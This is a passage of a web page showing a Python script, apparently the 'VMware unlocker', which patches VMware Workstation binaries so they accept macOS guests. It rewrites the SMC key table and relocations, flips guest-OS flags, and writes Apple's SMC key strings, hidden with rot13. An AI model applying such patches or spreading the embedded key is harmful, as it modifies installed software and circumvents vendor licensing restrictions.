class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">The MIT License (MIT)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Copyright (c) 2014-2018 Dave Parsons &amp; Sam Bingner</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function<br><span class="hljs-keyword">import</span> codecs<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">if</span> sys.version_info &lt; (<span class="hljs-number">2</span>, <span class="hljs-number">7</span>):<br>    sys.stderr.write(<span class="hljs-string">&#x27;You need Python 2.7 or later\n&#x27;</span>)<br>    sys.exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># Setup imports depending on whether IronPython or CPython</span><br><span class="hljs-keyword">if</span> sys.platform == <span class="hljs-string">&#x27;win32&#x27;</span> \<br>        <span class="hljs-keyword">or</span> sys.platform == <span class="hljs-string">&#x27;cli&#x27;</span>:<br>    <span class="hljs-comment"># noinspection PyUnresolvedReferences</span><br>    <span class="hljs-keyword">if</span> sys.version_info &gt; (<span class="hljs-number">3</span>, <span class="hljs-number">0</span>):<br>        <span class="hljs-keyword">from</span> winreg <span class="hljs-keyword">import</span> *<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">from</span> _winreg <span class="hljs-keyword">import</span> *<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bytetohex</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">if</span> sys.version_info &gt; (<span class="hljs-number">3</span>, <span class="hljs-number">0</span>):<br>        <span class="hljs-comment"># Python 3 code in this block</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-string">&quot;&#123;:02X&#125; &quot;</span>.<span class="hljs-built_in">format</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> data)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># Python 2 code in this block</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-string">&quot;&#123;:02X&#125; &quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">ord</span>(c)) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> data)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">joinpath</span>(<span class="hljs-params">folder, filename</span>):<br>    <span class="hljs-keyword">return</span> os.path.join(folder, filename)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">printkey</span>(<span class="hljs-params">i, offset, smc_key, smc_data</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(i + <span class="hljs-number">1</span>).zfill(<span class="hljs-number">3</span>)<br>          + <span class="hljs-string">&#x27; &#x27;</span> + <span class="hljs-built_in">hex</span>(offset)<br>          + <span class="hljs-string">&#x27; &#x27;</span> + smc_key[<span class="hljs-number">0</span>][::-<span class="hljs-number">1</span>].decode(<span class="hljs-string">&#x27;UTF-8&#x27;</span>)<br>          + <span class="hljs-string">&#x27; &#x27;</span> + <span class="hljs-built_in">str</span>(smc_key[<span class="hljs-number">1</span>]).zfill(<span class="hljs-number">2</span>)<br>          + <span class="hljs-string">&#x27; &#x27;</span> + smc_key[<span class="hljs-number">2</span>][::-<span class="hljs-number">1</span>].replace(<span class="hljs-string">b&#x27;\x00&#x27;</span>, <span class="hljs-string">b&#x27; &#x27;</span>).decode(<span class="hljs-string">&#x27;UTF-8&#x27;</span>)<br>          + <span class="hljs-string">&#x27; &#x27;</span> + <span class="hljs-string">&#x27;&#123;0:#0&#123;1&#125;x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(smc_key[<span class="hljs-number">3</span>], <span class="hljs-number">4</span>)<br>          + <span class="hljs-string">&#x27; &#x27;</span> + <span class="hljs-built_in">hex</span>(smc_key[<span class="hljs-number">4</span>])<br>          + <span class="hljs-string">&#x27; &#x27;</span> + bytetohex(smc_data))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_bit</span>(<span class="hljs-params">value, bit</span>):<br>    <span class="hljs-keyword">return</span> value | (<span class="hljs-number">1</span> &lt;&lt; bit)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">clear_bit</span>(<span class="hljs-params">value, bit</span>):<br>    <span class="hljs-keyword">return</span> value &amp; ~(<span class="hljs-number">1</span> &lt;&lt; bit)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_bit</span>(<span class="hljs-params">value, bit</span>):<br>    <span class="hljs-keyword">return</span> value &amp; bit<br><br><br>E_CLASS64 = <span class="hljs-number">2</span><br>E_SHT_RELA = <span class="hljs-number">4</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">patchelf</span>(<span class="hljs-params">f, oldoffset, newoffset</span>):<br>    f.seek(<span class="hljs-number">0</span>)<br>    magic = f.read(<span class="hljs-number">4</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> magic == <span class="hljs-string">b&#x27;\x7fELF&#x27;</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Magic number does not match&#x27;</span>)<br><br>    ei_class = struct.unpack(<span class="hljs-string">&#x27;=B&#x27;</span>, f.read(<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">if</span> ei_class != E_CLASS64:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Not 64bit elf header: &#x27;</span> + ei_class)<br><br>    f.seek(<span class="hljs-number">40</span>)<br>    e_shoff = struct.unpack(<span class="hljs-string">&#x27;=Q&#x27;</span>, f.read(<span class="hljs-number">8</span>))[<span class="hljs-number">0</span>]<br>    f.seek(<span class="hljs-number">58</span>)<br>    e_shentsize = struct.unpack(<span class="hljs-string">&#x27;=H&#x27;</span>, f.read(<span class="hljs-number">2</span>))[<span class="hljs-number">0</span>]<br>    e_shnum = struct.unpack(<span class="hljs-string">&#x27;=H&#x27;</span>, f.read(<span class="hljs-number">2</span>))[<span class="hljs-number">0</span>]<br>    e_shstrndx = struct.unpack(<span class="hljs-string">&#x27;=H&#x27;</span>, f.read(<span class="hljs-number">2</span>))[<span class="hljs-number">0</span>]<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;e_shoff: 0x&#123;:x&#125; e_shentsize: 0x&#123;:x&#125; e_shnum:0x&#123;:x&#125; e_shstrndx:0x&#123;:x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(e_shoff, e_shentsize,<br>                                                                                        e_shnum, e_shstrndx))<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, e_shnum):<br>        f.seek(e_shoff + i * e_shentsize)<br>        e_sh = struct.unpack(<span class="hljs-string">&#x27;=LLQQQQLLQQ&#x27;</span>, f.read(e_shentsize))<br>        <span class="hljs-comment"># e_sh_name = e_sh[0]</span><br>        e_sh_type = e_sh[<span class="hljs-number">1</span>]<br>        e_sh_offset = e_sh[<span class="hljs-number">4</span>]<br>        e_sh_size = e_sh[<span class="hljs-number">5</span>]<br>        e_sh_entsize = e_sh[<span class="hljs-number">9</span>]<br>        <span class="hljs-keyword">if</span> e_sh_type == E_SHT_RELA:<br>            e_sh_nument = <span class="hljs-built_in">int</span>(e_sh_size / e_sh_entsize)<br>            <span class="hljs-comment"># print &#x27;RELA at 0x&#123;:x&#125; with &#123;:d&#125; entries&#x27;.format(e_sh_offset, e_sh_nument)</span><br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, e_sh_nument):<br>                f.seek(e_sh_offset + e_sh_entsize * j)<br>                rela = struct.unpack(<span class="hljs-string">&#x27;=QQq&#x27;</span>, f.read(e_sh_entsize))<br>                r_offset = rela[<span class="hljs-number">0</span>]<br>                r_info = rela[<span class="hljs-number">1</span>]<br>                r_addend = rela[<span class="hljs-number">2</span>]<br>                <span class="hljs-keyword">if</span> r_addend == oldoffset:<br>                    r_addend = newoffset<br>                    f.seek(e_sh_offset + e_sh_entsize * j)<br>                    f.write(struct.pack(<span class="hljs-string">&#x27;=QQq&#x27;</span>, r_offset, r_info, r_addend))<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Relocation modified at: &#x27;</span> + <span class="hljs-built_in">hex</span>(e_sh_offset + e_sh_entsize * j))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">patchkeys</span>(<span class="hljs-params">f, key</span>):<br>    <span class="hljs-comment"># Setup struct pack string</span><br>    key_pack = <span class="hljs-string">&#x27;=4sB4sB6xQ&#x27;</span><br>    <span class="hljs-comment"># smc_old_memptr = 0</span><br>    smc_new_memptr = <span class="hljs-number">0</span><br><br>    <span class="hljs-comment"># Do Until OSK1 read</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br><br>        <span class="hljs-comment"># Read key into struct str and data byte str</span><br>        offset = key + (i * <span class="hljs-number">72</span>)<br>        f.seek(offset)<br>        smc_key = struct.unpack(key_pack, f.read(<span class="hljs-number">24</span>))<br>        smc_data = f.read(smc_key[<span class="hljs-number">1</span>])<br><br>        <span class="hljs-comment"># Reset pointer to beginning of key entry</span><br>        f.seek(offset)<br><br>        <span class="hljs-keyword">if</span> smc_key[<span class="hljs-number">0</span>] == <span class="hljs-string">b&#x27;SKL+&#x27;</span>:<br>            <span class="hljs-comment"># Use the +LKS data routine for OSK0/1</span><br>            smc_new_memptr = smc_key[<span class="hljs-number">4</span>]<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;+LKS Key: &#x27;</span>)<br>            printkey(i, offset, smc_key, smc_data)<br><br>        <span class="hljs-keyword">elif</span> smc_key[<span class="hljs-number">0</span>] == <span class="hljs-string">b&#x27;0KSO&#x27;</span>:<br>            <span class="hljs-comment"># Write new data routine pointer from +LKS</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;OSK0 Key Before:&#x27;</span>)<br>            printkey(i, offset, smc_key, smc_data)<br>            <span class="hljs-comment"># smc_old_memptr = smc_key[4]</span><br>            f.seek(offset)<br>            f.write(struct.pack(key_pack, smc_key[<span class="hljs-number">0</span>], smc_key[<span class="hljs-number">1</span>], smc_key[<span class="hljs-number">2</span>], smc_key[<span class="hljs-number">3</span>], smc_new_memptr))<br>            f.flush()<br><br>            <span class="hljs-comment"># Write new data for key</span><br>            f.seek(offset + <span class="hljs-number">24</span>)<br>            smc_new_data = codecs.encode(<span class="hljs-string">&#x27;bheuneqjbexolgurfrjbeqfthneqrqcy&#x27;</span>, <span class="hljs-string">&#x27;rot_13&#x27;</span>)<br>            f.write(smc_new_data.encode(<span class="hljs-string">&#x27;UTF-8&#x27;</span>))<br>            f.flush()<br><br>            <span class="hljs-comment"># Re-read and print key</span><br>            f.seek(offset)<br>            smc_key = struct.unpack(key_pack, f.read(<span class="hljs-number">24</span>))<br>            smc_data = f.read(smc_key[<span class="hljs-number">1</span>])<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;OSK0 Key After:&#x27;</span>)<br>            printkey(i, offset, smc_key, smc_data)<br><br>        <span class="hljs-keyword">elif</span> smc_key[<span class="hljs-number">0</span>] == <span class="hljs-string">b&#x27;1KSO&#x27;</span>:<br>            <span class="hljs-comment"># Write new data routine pointer from +LKS</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;OSK1 Key Before:&#x27;</span>)<br>            printkey(i, offset, smc_key, smc_data)<br>            smc_old_memptr = smc_key[<span class="hljs-number">4</span>]<br>            f.seek(offset)<br>            f.write(struct.pack(key_pack, smc_key[<span class="hljs-number">0</span>], smc_key[<span class="hljs-number">1</span>], smc_key[<span class="hljs-number">2</span>], smc_key[<span class="hljs-number">3</span>], smc_new_memptr))<br>            f.flush()<br><br>            <span class="hljs-comment"># Write new data for key</span><br>            f.seek(offset + <span class="hljs-number">24</span>)<br>            smc_new_data = codecs.encode(<span class="hljs-string">&#x27;rnfrqbagfgrny(p)NccyrPbzchgreVap&#x27;</span>, <span class="hljs-string">&#x27;rot_13&#x27;</span>)<br>            f.write(smc_new_data.encode(<span class="hljs-string">&#x27;UTF-8&#x27;</span>))<br>            f.flush()<br><br>            <span class="hljs-comment"># Re-read and print key</span><br>            f.seek(offset)<br>            smc_key = struct.unpack(key_pack, f.read(<span class="hljs-number">24</span>))<br>            smc_data = f.read(smc_key[<span class="hljs-number">1</span>])<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;OSK1 Key After:&#x27;</span>)<br>            printkey(i, offset, smc_key, smc_data)<br><br>            <span class="hljs-comment"># Finished so get out of loop</span><br>            <span class="hljs-keyword">break</span><br><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">pass</span><br><br>        i += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> smc_old_memptr, smc_new_memptr<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">patchsmc</span>(<span class="hljs-params">name, sharedobj</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(name, <span class="hljs-string">&#x27;r+b&#x27;</span>) <span class="hljs-keyword">as</span> f:<br><br>        smc_old_memptr = <span class="hljs-number">0</span><br>        smc_new_memptr = <span class="hljs-number">0</span><br><br>        <span class="hljs-comment"># Read file into string variable</span><br>        vmx = f.read()<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;File: &#x27;</span> + name + <span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>        <span class="hljs-comment"># Setup hex string for vSMC headers</span><br>        <span class="hljs-comment"># These are the private and public key counts</span><br>        smc_header_v0 = <span class="hljs-string">b&#x27;\xF2\x00\x00\x00\xF0\x00\x00\x00&#x27;</span><br>        smc_header_v1 = <span class="hljs-string">b&#x27;\xB4\x01\x00\x00\xB0\x01\x00\x00&#x27;</span><br><br>        <span class="hljs-comment"># Setup hex string for #KEY key</span><br>        key_key = <span class="hljs-string">b&#x27;\x59\x45\x4B\x23\x04\x32\x33\x69\x75&#x27;</span><br><br>        <span class="hljs-comment"># Setup hex string for $Adr key</span><br>        adr_key = <span class="hljs-string">b&#x27;\x72\x64\x41\x24\x04\x32\x33\x69\x75&#x27;</span><br><br>        <span class="hljs-comment"># Find the vSMC headers</span><br>        smc_header_v0_offset = vmx.find(smc_header_v0) - <span class="hljs-number">8</span><br>        smc_header_v1_offset = vmx.find(smc_header_v1) - <span class="hljs-number">8</span><br><br>        <span class="hljs-comment"># Find &#x27;#KEY&#x27; keys</span><br>        smc_key0 = vmx.find(key_key)<br>        smc_key1 = vmx.rfind(key_key)<br><br>        <span class="hljs-comment"># Find &#x27;$Adr&#x27; key only V1 table</span><br>        smc_adr = vmx.find(adr_key)<br><br>        <span class="hljs-comment"># Print vSMC0 tables and keys</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;appleSMCTableV0 (smc.version = &quot;0&quot;)&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;appleSMCTableV0 Address      : &#x27;</span> + <span class="hljs-built_in">hex</span>(smc_header_v0_offset))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;appleSMCTableV0 Private Key #: 0xF2/242&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;appleSMCTableV0 Public Key  #: 0xF0/240&#x27;</span>)<br><br>        <span class="hljs-keyword">if</span> (smc_adr - smc_key0) != <span class="hljs-number">72</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;appleSMCTableV0 Table        : &#x27;</span> + <span class="hljs-built_in">hex</span>(smc_key0))<br>            smc_old_memptr, smc_new_memptr = patchkeys(f, smc_key0)<br>        <span class="hljs-keyword">elif</span> (smc_adr - smc_key1) != <span class="hljs-number">72</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;appleSMCTableV0 Table        : &#x27;</span> + <span class="hljs-built_in">hex</span>(smc_key1))<br>            smc_old_memptr, smc_new_memptr = patchkeys(f, smc_key1)<br><br>        <span class="hljs-built_in">print</span>()<br><br>        <span class="hljs-comment"># Print vSMC1 tables and keys</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;appleSMCTableV1 (smc.version = &quot;1&quot;)&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;appleSMCTableV1 Address      : &#x27;</span> + <span class="hljs-built_in">hex</span>(smc_header_v1_offset))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;appleSMCTableV1 Private Key #: 0x01B4/436&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;appleSMCTableV1 Public Key  #: 0x01B0/432&#x27;</span>)<br><br>        <span class="hljs-keyword">if</span> (smc_adr - smc_key0) == <span class="hljs-number">72</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;appleSMCTableV1 Table        : &#x27;</span> + <span class="hljs-built_in">hex</span>(smc_key0))<br>            smc_old_memptr, smc_new_memptr = patchkeys(f, smc_key0)<br>        <span class="hljs-keyword">elif</span> (smc_adr - smc_key1) == <span class="hljs-number">72</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;appleSMCTableV1 Table        : &#x27;</span> + <span class="hljs-built_in">hex</span>(smc_key1))<br>            smc_old_memptr, smc_new_memptr = patchkeys(f, smc_key1)<br><br>        <span class="hljs-built_in">print</span>()<br><br>        <span class="hljs-comment"># Find matching RELA record in .rela.dyn in ESXi ELF files</span><br>        <span class="hljs-comment"># This is temporary code until proper ELF parsing written</span><br>        <span class="hljs-keyword">if</span> sharedobj:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Modifying RELA records from: &#x27;</span> + <span class="hljs-built_in">hex</span>(smc_old_memptr) + <span class="hljs-string">&#x27; to &#x27;</span> + <span class="hljs-built_in">hex</span>(smc_new_memptr))<br>            patchelf(f, smc_old_memptr, smc_new_memptr)<br><br>        <span class="hljs-comment"># Tidy up</span><br>        f.flush()<br>        f.close()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">patchbase</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-comment"># Patch file</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;GOS Patching: &#x27;</span> + name)<br>    f = <span class="hljs-built_in">open</span>(name, <span class="hljs-string">&#x27;r+b&#x27;</span>)<br><br>    <span class="hljs-comment"># Entry to search for in GOS table</span><br>    <span class="hljs-comment"># Should work for Workstation 12-15...</span><br>    darwin = re.<span class="hljs-built_in">compile</span>(<br>             <span class="hljs-string">b&#x27;\x10\x00\x00\x00[\x10|\x20]\x00\x00\x00[\x01|\x02]\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br>             <span class="hljs-string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span>)<br><br>    <span class="hljs-comment"># Read file into string variable</span><br>    base = f.read()<br><br>    <span class="hljs-comment"># Loop through each entry and set top bit</span><br>    <span class="hljs-comment"># 0xBE --&gt; 0xBF (WKS 12)</span><br>    <span class="hljs-comment"># 0x3E --&gt; 0x3F (WKS 14)</span><br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> darwin.finditer(base):<br>        offset = m.start()<br>        f.seek(offset + <span class="hljs-number">32</span>)<br>        flag = <span class="hljs-built_in">ord</span>(f.read(<span class="hljs-number">1</span>))<br>        flag = set_bit(flag, <span class="hljs-number">0</span>)<br><span class="hljs-comment">#        flag = chr(flag)</span><br>        f.seek(offset + <span class="hljs-number">32</span>)<br>        f.write(<span class="hljs-built_in">bytes</span>([flag]))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;GOS Patched flag @: &#x27;</span> + <span class="hljs-built_in">hex</span>(offset))<br><br>    <span class="hljs-comment"># Tidy up</span><br>    f.flush()<br>    f.close()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;GOS Patched: &#x27;</span> + name)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">patchvmkctl</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-comment"># Patch file</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;smcPresent Patching: &#x27;</span> + name)<br>    f = <span class="hljs-built_in">open</span>(name, <span class="hljs-string">&#x27;r+b&#x27;</span>)<br><br>    <span class="hljs-comment"># Read file into string variable</span><br>    vmkctl = f.read()<br>    applesmc = vmkctl.find(<span class="hljs-string">b&#x27;applesmc&#x27;</span>)<br>    f.seek(applesmc)<br>    f.write(<span class="hljs-string">b&#x27;vmkernel&#x27;</span>)<br><br>    <span class="hljs-comment"># Tidy up</span><br>    f.flush()<br>    f.close()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;smcPresent Patched: &#x27;</span> + name)<br><br><br><span class="hljs-comment"># noinspection PyUnresolvedReferences</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment"># Work around absent Platform module on VMkernel</span><br>    <span class="hljs-keyword">if</span> os.name == <span class="hljs-string">&#x27;nt&#x27;</span> <span class="hljs-keyword">or</span> os.name == <span class="hljs-string">&#x27;cli&#x27;</span>:<br>        osname = <span class="hljs-string">&#x27;windows&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        osname = os.uname()[<span class="hljs-number">0</span>].lower()<br><br>    <span class="hljs-comment"># vmwarebase = &#x27;&#x27;</span><br>    vmx_so = <span class="hljs-literal">False</span><br><br>    <span class="hljs-comment"># Setup default paths</span><br>    <span class="hljs-keyword">if</span> osname == <span class="hljs-string">&#x27;linux&#x27;</span>:<br>        vmx_path = <span class="hljs-string">&#x27;/usr/lib/vmware/bin/&#x27;</span><br>        vmx = joinpath(vmx_path, <span class="hljs-string">&#x27;vmware-vmx&#x27;</span>)<br>        vmx_debug = joinpath(vmx_path, <span class="hljs-string">&#x27;vmware-vmx-debug&#x27;</span>)<br>        vmx_stats = joinpath(vmx_path, <span class="hljs-string">&#x27;vmware-vmx-stats&#x27;</span>)<br>        <span class="hljs-keyword">if</span> os.path.isfile(<span class="hljs-string">&#x27;/usr/lib/vmware/lib/libvmwarebase.so/libvmwarebase.so&#x27;</span>):<br>            vmx_so = <span class="hljs-literal">True</span><br>            vmwarebase = <span class="hljs-string">&#x27;/usr/lib/vmware/lib/libvmwarebase.so/libvmwarebase.so&#x27;</span><br>        <span class="hljs-keyword">else</span>:<br>            vmwarebase = <span class="hljs-string">&#x27;/usr/lib/vmware/lib/libvmwarebase.so.0/libvmwarebase.so.0&#x27;</span><br><br>    <span class="hljs-keyword">elif</span> osname == <span class="hljs-string">&#x27;windows&#x27;</span>:<br>        reg = ConnectRegistry(<span class="hljs-literal">None</span>, HKEY_LOCAL_MACHINE)<br>        key = OpenKey(reg, <span class="hljs-string">r&#x27;SOFTWARE\Wow6432Node\VMware, Inc.\VMware Workstation&#x27;</span>)<br>        vmwarebase_path = QueryValueEx(key, <span class="hljs-string">&#x27;InstallPath&#x27;</span>)[<span class="hljs-number">0</span>]<br>        vmx_path = QueryValueEx(key, <span class="hljs-string">&#x27;InstallPath64&#x27;</span>)[<span class="hljs-number">0</span>]<br>        vmx = joinpath(vmx_path, <span class="hljs-string">&#x27;vmware-vmx.exe&#x27;</span>)<br>        vmx_debug = joinpath(vmx_path, <span class="hljs-string">&#x27;vmware-vmx-debug.exe&#x27;</span>)<br>        vmx_stats = joinpath(vmx_path, <span class="hljs-string">&#x27;vmware-vmx-stats.exe&#x27;</span>)<br>        vmwarebase = joinpath(vmwarebase_path, <span class="hljs-string">&#x27;vmwarebase.dll&#x27;</span>)<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Unknown Operating System: &#x27;</span> + osname)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-comment"># Patch the vmx executables skipping stats version for Player</span><br>    patchsmc(vmx, vmx_so)<br>    patchsmc(vmx_debug, vmx_so)<br>    <span class="hljs-keyword">if</span> 